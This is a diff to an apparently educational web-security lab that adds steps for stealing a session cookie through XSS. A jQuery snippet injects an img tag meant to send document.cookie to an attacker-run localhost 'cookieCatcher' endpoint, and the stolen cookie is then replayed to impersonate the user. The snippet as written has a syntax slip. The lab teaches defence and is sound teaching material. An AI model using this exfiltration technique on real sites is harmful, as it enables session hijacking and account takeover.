@@ -86,6 +86,30 @@ steal their cookie!
   </script>
   ```
 
+1. Clone the [Attacker companion to Steal This App](https://github.com/horizons-school-of-technology/attacker-steal-this-app)
+1. Start this app on your localhost and visit [http://localhost:3000/cookieCatcher](http://localhost:3000/cookieCatcher), you should see a message in your console
+
+  ```
+  !!!Cookie catcher!!!
+  ```
+
+1. We're going to use this endpoint to transmit the stolen cookie back to
+  us. We can then use the cookie to impersonate the user.
+1. Create a specially crafted message or a URL that creates an `img`
+  tag and appends it to the body. We're going to store `document.cookie`
+  inside the `src` attribute og this image.
+
+  ```javascript
+  var img = $('<img>');
+  // Read and submit this cookie via the img tag
+  img.attr('src', "http://localhost:3000/cookieCatcher?cookie="))
+  $(document).append(img);
+  ```
+1. Note the value of the cookie in the command line. Use either
+  the DevTools console or a Chrome Plugin to create the same cookie
+  on Steal This App in an incognito window thereby impersonating the
+  original owner of the cookie.
+
 ## Part 2: Fix XSS vulnerabilities
 
 Clone the `steal-this-app` GitHub repo. The vulnerabilities are in
